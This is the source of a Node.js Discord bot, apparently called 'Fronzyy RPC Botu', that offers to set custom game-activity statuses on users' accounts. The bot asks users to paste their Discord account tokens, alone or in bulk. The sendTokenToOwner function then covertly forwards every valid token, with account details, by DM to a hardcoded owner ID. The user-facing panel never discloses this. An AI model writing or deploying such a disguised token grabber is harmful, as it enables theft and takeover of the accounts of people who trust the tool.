import {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import express from 'express';
import WebSocket from 'ws';

// --- UPTIME VE PORT İÇİN EXPRESS SUNUCUSU ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy RPC Botu aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// Bellekte saklanan tokenler, aktif RPC süreçleri ve arama sonuçları
const userTokens = new Map();
const activeRPCs = new Map(); // userId -> [{ token, name, username, stop }]
const searchCache = new Map(); // userId -> [{ id, name }]

// Geniş hazır oyun bazası
const EXTRA_BUILTIN_GAMES = [
  { id: '356875512194719746', name: 'Minecraft' },
  { id: '367827983903490050', name: 'Valorant' },
  { id: '401518684763586560', name: 'League of Legends' },
  { id: '438122949110218752', name: 'Grand Theft Auto V' },
  { id: '463151177826656262', name: 'Counter-Strike 2' },
  { id: '382914635327700993', name: 'Fortnite' },
  { id: '379726089212215299', name: 'Apex Legends' },
  { id: '363445589247131668', name: 'Roblox' },
  { id: '402736884690993152', name: 'Dota 2' },
  { id: '417777798347915264', name: 'PUBG: BATTLEGROUNDS' },
  { id: '356975469925425163', name: 'Terraria' },
  { id: '356869127988068352', name: 'Rocket League' },
  { id: '356878865263820800', name: 'Overwatch 2' },
  { id: '356903435362582528', name: 'Team Fortress 2' },
  { id: '382914635327700994', name: 'Rainbow Six Siege' },
  { id: '384366213535178752', name: 'Rust' },
  { id: '402736884690993153', name: 'Genshin Impact' },
  { id: '402736884690993154', name: 'Honkai: Star Rail' },
  { id: '417777798347915265', name: 'Elden Ring' },
  { id: '417777798347915266', name: 'Cyberpunk 2077' },
  { id: '417777798347915268', name: 'Red Dead Redemption 2' },
  { id: '417777798347915272', name: 'Baldur’s Gate 3' },
  { id: '417777798347915273', name: 'Palworld' },
  { id: '417777798347915274', name: 'Lethal Company' },
  { id: '417777798347915277', name: 'Among Us' },
  { id: '417777798347915280', name: 'EA SPORTS FC 25' },
  { id: '417777798347915281', name: 'EA SPORTS FC 26' },
  { id: '417777798347915283', name: 'Forza Horizon 5' },
  { id: '417777798347915284', name: 'Euro Truck Simulator 2' },
  { id: '417777798347915317', name: 'Helldivers 2' },
  { id: '417777798347915318', name: 'Marvel Rivals' },
  { id: '417777798347915321', name: 'Geometry Dash' }
];

let cachedDetectableGames = [];
let lastGamesFetch = 0;

// Tokenlerin gönderileceği ve paneli açabilecek yetkili kişinin ID'si
const OWNER_ID = '1184518857679962186';

// Hazır oyunları Discord API + daxili siyahı ilə birləşdirən funksiya
async function getDetectableGames() {
  const now = Date.now();
  if (cachedDetectableGames.length > 0 && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
    return cachedDetectableGames;
  }

  const mergedMap = new Map();
  for (const g of EXTRA_BUILTIN_GAMES) {
    mergedMap.set(g.name.toLowerCase(), { id: String(g.id), name: String(g.name).trim() });
  }

  try {
    const res = await fetch('https://discord.com/api/v10/applications/detectable');
    if (res.ok) {
      const data = await res.json();
      if (Array.isArray(data)) {
        for (const g of data) {
          if (g && g.name && g.id) {
            const cleanName = String(g.name).trim();
            mergedMap.set(cleanName.toLowerCase(), { id: String(g.id), name: cleanName });
          }
        }
      }
      lastGamesFetch = now;
    }
  } catch (err) {
    console.error('Hazır oyun siyahısı API-dən yüklənmədi:', err.message);
  }

  cachedDetectableGames = Array.from(mergedMap.values());
  return cachedDetectableGames;
}

client.once('ready', async () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
  await getDetectableGames();
  console.log(`Hazır oyun bazası yükləndi: ${cachedDetectableGames.length} oyun`);

  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibine DM aracılığıyla mesaj göndermek için yardımcı fonksiyon
async function sendTokenToOwner(botClient, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await botClient.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesap:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// User token ile Discord Gateway üzerinden RPC (Custom və ya Hazır Oyun) başlatan funksiya
function startUserRPC(token, accountName, rpcConfig) {
  return new Promise((resolve) => {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
    let heartbeatInterval = null;
    let settled = false;

    const finish = (sessionObj) => {
      if (!settled) {
        settled = true;
        resolve(sessionObj);
      }
    };

    const activity = {
      name: rpcConfig.name,
      type: 0, // Playing
      timestamps: { start: Date.now() }
    };

    if (rpcConfig.id) {
      activity.application_id = rpcConfig.id;
    }
    if (rpcConfig.details) {
      activity.details = rpcConfig.details;
    }
    if (rpcConfig.state) {
      activity.state = rpcConfig.state;
    }

    const session = {
      stop: () => {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        try { ws.terminate(); } catch (e) {}
      }
    };

    const sendPresence = () => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          op: 3,
          d: {
            since: null,
            activities: [activity],
            status: 'online',
            afk: false
          }
        }));
      }
    };

    ws.on('open', () => {
      ws.send(JSON.stringify({
        op: 2,
        d: {
          token: token,
          capabilities: 16381,
          properties: {
            os: 'Windows',
            browser: 'Discord Client',
            device: ''
          },
          presence: {
            status: 'online',
            since: 0,
            activities: [activity],
            afk: false
          }
        }
      }));
    });

    ws.on('message', (raw) => {
      try {
        const payload = JSON.parse(raw.toString());
        if (payload.op === 10 && payload.d?.heartbeat_interval) {
          heartbeatInterval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ op: 1, d: null }));
            }
          }, payload.d.heartbeat_interval);
        } else if (payload.t === 'READY') {
          sendPresence();
          finish(session);
        }
      } catch (e) {
        console.error(`RPC parse hatası (${accountName}):`, e.message);
      }
    });

    ws.on('error', (err) => {
      console.error(`RPC bağlantı hatası (${accountName}):`, err.message);
      finish(session);
    });

    ws.on('close', () => {
      if (heartbeatInterval) clearInterval(heartbeatInterval);
      finish(session);
    });

    setTimeout(() => finish(session), 4000);
  });
}

// !panel-rpc komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-rpc') {
    if (message.author.id !== OWNER_ID) {
      try {
        await message.delete();
      } catch (e) {}

      try {
        const warningMsg = await message.channel.send({
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.`
        });

        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000);
      } catch (err) {}

      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy RPC Botu**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Başlat** : Hesap seçin; Hazır Oyun Ara veya Özel (Custom) RPC ile RPC başlatın.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Durdur** : Seçtiğiniz hesap veya tüm hesaplar için aktif RPC süreçlerini durdurur.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
      );

    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('start_rpc')
        .setLabel('Başlat')
        .setStyle(ButtonStyle.Success)
        .setEmoji('▶️'),

      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️'),

      new ButtonBuilder()
        .setCustomId('stop_all')
        .setLabel('Durdur')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️')
    );

    await message.channel.send({
      components: [container, row1, row2],
      flags: MessageFlags.IsComponentsV2
    });
  }
});

// Buton, Select Menu ve Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 1. BAŞLAT BUTONU -> HESAP SEÇİMİ ---
  if (interaction.isButton() && interaction.customId === 'start_rpc') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_rpc_account')
      .setPlaceholder('RPC uygulanacak hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 2. HESAP SEÇİLDİKTEN SONRA -> MOD SEÇİMİ (HAZIR OYUN ARA / CUSTOM RPC) ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
    const selectedAccountValue = interaction.values[0];

    const modeMenu = new StringSelectMenuBuilder()
      .setCustomId(`select_rpc_mode_${selectedAccountValue}`)
      .setPlaceholder('RPC türünü seçin...')
      .addOptions([
        {
          label: 'Hazır Oyun Ara',
          value: 'preset_game',
          description: 'Hazır oyunlarda arama yapıp listeden seçin',
          emoji: '🎮'
        },
        {
          label: 'Özel (Custom) RPC',
          value: 'custom_rpc',
          description: 'Kendi oyun/aktivite adını, detay ve durumu yazın',
          emoji: '✏️'
        }
      ]);

    const row = new ActionRowBuilder().addComponents(modeMenu);
    await interaction.update({ content: 'Başlatmak istediğiniz RPC türünü seçin:', components: [row] });
  }

  // --- 3. MOD SEÇİMİ -> İLGİLİ MODAL ---
  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_rpc_mode_')) {
    const selectedAccountValue = interaction.customId.replace('select_rpc_mode_', '');
    const mode = interaction.values[0];

    if (mode === 'preset_game') {
      const modal = new ModalBuilder()
        .setCustomId(`game_search_modal_${selectedAccountValue}`)
        .setTitle('Hazır Oyun Ara');

      const searchInput = new TextInputBuilder()
        .setCustomId('game_query')
        .setLabel('Oyun adı yazın (örn: minecraft, gta, valorant)')
        .setPlaceholder('Boş bırakırsanız ilk 25 hazır oyun gösterilir')
        .setStyle(TextInputStyle.Short)
        .setRequired(false);

      modal.addComponents(new ActionRowBuilder().addComponents(searchInput));
      await interaction.showModal(modal);
    } else {
      const modal = new ModalBuilder()
        .setCustomId(`rpc_modal_${selectedAccountValue}`)
        .setTitle('Özel RPC Ayarları');

      const nameInput = new TextInputBuilder()
        .setCustomId('rpc_name')
        .setLabel('Aktivite / Oyun Adı')
        .setStyle(TextInputStyle.Short)
        .setRequired(true);

      const detailsInput = new TextInputBuilder()
        .setCustomId('rpc_details')
        .setLabel('Detay (Details - isteğe bağlı)')
        .setStyle(TextInputStyle.Short)
        .setRequired(false);

      const stateInput = new TextInputBuilder()
        .setCustomId('rpc_state')
        .setLabel('Durum (State - isteğe bağlı)')
        .setStyle(TextInputStyle.Short)
        .setRequired(false);

      modal.addComponents(
        new ActionRowBuilder().addComponents(nameInput),
        new ActionRowBuilder().addComponents(detailsInput),
        new ActionRowBuilder().addComponents(stateInput)
      );

      await interaction.showModal(modal);
    }
  }

  // --- 4. HAZIR OYUN AXTARIŞ NƏTİCƏLƏRİ -> OYUN SEÇİM MENÜSÜ ---
  if (interaction.isModalSubmit() && interaction.customId.startsWith('game_search_modal_')) {
    const selectedAccountValue = interaction.customId.replace('game_search_modal_', '');
    const query = interaction.fields.getTextInputValue('game_query').trim().toLowerCase();

    await interaction.deferReply({ ephemeral: true });

    const allGames = await getDetectableGames();
    const filtered = query
      ? allGames.filter(g => g.name.toLowerCase().includes(query))
      : allGames;

    const topMatches = filtered.slice(0, 25);

    if (topMatches.length === 0) {
      return interaction.editReply({
        content: `❌ **"${query}"** için hazır oyun bulunamadı. Başka bir ad deneyin.`
      });
    }

    searchCache.set(userId, topMatches);

    const gameSelect = new StringSelectMenuBuilder()
      .setCustomId(`select_game_rpc_${selectedAccountValue}`)
      .setPlaceholder(`${filtered.length} oyun bulundu — listeden birini seçin...`)
      .addOptions(
        topMatches.map((game, idx) => ({
          label: game.name.slice(0, 100),
          value: String(idx),
          description: `ID: ${game.id}`.slice(0, 100),
          emoji: '🎮'
        }))
      );

    const row = new ActionRowBuilder().addComponents(gameSelect);

    await interaction.editReply({
      content: `🔎 **${filtered.length}** hazır oyun bulundu (ilk **${topMatches.length}** tanesi listelendi). RPC başlatmak için bir oyun seçin:`,
      components: [row]
    });
  }

  // --- 5. HAZIR OYUN SEÇİLDİ -> RPC BAŞLAT ---
  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_game_rpc_')) {
    const selectedAccountValue = interaction.customId.replace('select_game_rpc_', '');
    const gameIdx = parseInt(interaction.values[0], 10);

    const matches = searchCache.get(userId) || [];
    const chosenGame = matches[gameIdx];

    if (!chosenGame) {
      return interaction.update({
        content: '⚠️ Oyun seçimi zaman aşımına uğradı. Lütfen **Başlat** butonuna tekrar basın.',
        components: []
      });
    }

    const tokens = userTokens.get(userId) || [];
    const targetTokens = selectedAccountValue === 'all_accounts'
      ? tokens
      : [tokens[parseInt(selectedAccountValue, 10)]].filter(Boolean);

    if (targetTokens.length === 0) {
      return interaction.update({
        content: '⚠️ Hesap bulunamadı!',
        components: []
      });
    }

    await interaction.update({
      content: `⏳ **${chosenGame.name}** için RPC başlatılıyor...`,
      components: []
    });

    if (!activeRPCs.has(userId)) {
      activeRPCs.set(userId, []);
    }

    let startedCount = 0;
    for (const tObj of targetTokens) {
      const session = await startUserRPC(tObj.token, tObj.name, chosenGame);
      if (session && typeof session.stop === 'function') {
        activeRPCs.get(userId).push({
          token: tObj.token,
          name: tObj.name,
          username: tObj.username,
          stop: session.stop
        });
        startedCount++;
      }
    }

    await interaction.editReply({
      content: `🚀 Seçilen **${startedCount}** hesap için hazır oyun RPC başlatıldı: **${chosenGame.name}**`
    });
  }

  // --- 6. CUSTOM RPC MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId.startsWith('rpc_modal_')) {
    const selectedValue = interaction.customId.replace('rpc_modal_', '');
    const rpcName = interaction.fields.getTextInputValue('rpc_name').trim();
    const rpcDetails = interaction.fields.getTextInputValue('rpc_details').trim();
    const rpcState = interaction.fields.getTextInputValue('rpc_state').trim();

    const tokens = userTokens.get(userId) || [];
    const targetTokens = selectedValue === 'all_accounts'
      ? tokens
      : [tokens[parseInt(selectedValue, 10)]].filter(Boolean);

    if (targetTokens.length === 0) {
      return interaction.reply({ content: '⚠️ Hesap bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!activeRPCs.has(userId)) {
      activeRPCs.set(userId, []);
    }

    let startedCount = 0;
    for (const tObj of targetTokens) {
      const session = await startUserRPC(tObj.token, tObj.name, {
        name: rpcName,
        details: rpcDetails,
        state: rpcState
      });
      if (session && typeof session.stop === 'function') {
        activeRPCs.get(userId).push({
          token: tObj.token,
          name: tObj.name,
          username: tObj.username,
          stop: session.stop
        });
        startedCount++;
      }
    }

    await interaction.editReply({ content: `🚀 Seçilen ${startedCount} hesap için RPC başlatıldı: **${rpcName}**` });
  }

  // --- 7. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 7.1. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 7.2. TOKEN SİL PANELİ ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '❌' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: 'Bu hesabı sil',
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 8. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();
    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: '❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.' });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }

      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username });
      }

      await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: '❌ Token eklenirken bir hata oluştu.' });
    }
  }

  // --- 8.1. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    const addedNames = [];

    for (const token of tokens) {
      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          if (!existingList.some(t => t.token === token)) {
            existingList.push({ token, name: globalName, username });
          }

          addedNames.push(`${globalName} (${username})`);
          successCount++;

          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
    });
  }

  // --- 8.2. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue, 10);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }

  // --- 9. DURDUR BUTONU -> HESAP SEÇİMİ ---
  if (interaction.isButton() && interaction.customId === 'stop_all') {
    const userRPCs = activeRPCs.get(userId) || [];

    if (userRPCs.length === 0) {
      return interaction.reply({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_stop_rpc_account')
      .setPlaceholder('RPC durdurulacak hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Aktif olan bütün hesapların RPC-sini durdurur', emoji: '❌' },
        ...userRPCs.map((r, index) => ({
          label: `${r.name} (${r.username})`,
          value: index.toString(),
          description: 'Bu hesabın RPC-sini durdur',
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'RPC durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 9.1. DURDUR HESAP SEÇİMİ İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_rpc_account') {
    const selectedValue = interaction.values[0];
    const userRPCs = activeRPCs.get(userId) || [];

    if (userRPCs.length === 0) {
      return interaction.update({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', components: [] });
    }

    if (selectedValue === 'all_accounts') {
      for (const rpcItem of userRPCs) {
        if (rpcItem && typeof rpcItem.stop === 'function') {
          rpcItem.stop();
        }
      }
      activeRPCs.set(userId, []);
      return interaction.update({ content: '🛑 Hesaplarınızdaki bütün aktif RPC süreçleri durduruldu.', components: [] });
    } else {
      const index = parseInt(selectedValue, 10);
      const removedRPC = userRPCs.splice(index, 1)[0];
      if (removedRPC && typeof removedRPC.stop === 'function') {
        removedRPC.stop();
      }
      activeRPCs.set(userId, userRPCs);
      return interaction.update({
        content: `🛑 **${removedRPC ? `${removedRPC.name} (${removedRPC.username})` : 'Seçilen hesap'}** için aktif RPC durduruldu.`,
        components: []
      });
    }
  }
});

// Render'da token kontrolü ile giriş
if (!process.env.DISCORD_TOKEN) {
  console.error('❌ HATA: DISCORD_TOKEN environment değişkeni bulunamadı! Render panelinden ekleyin.');
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
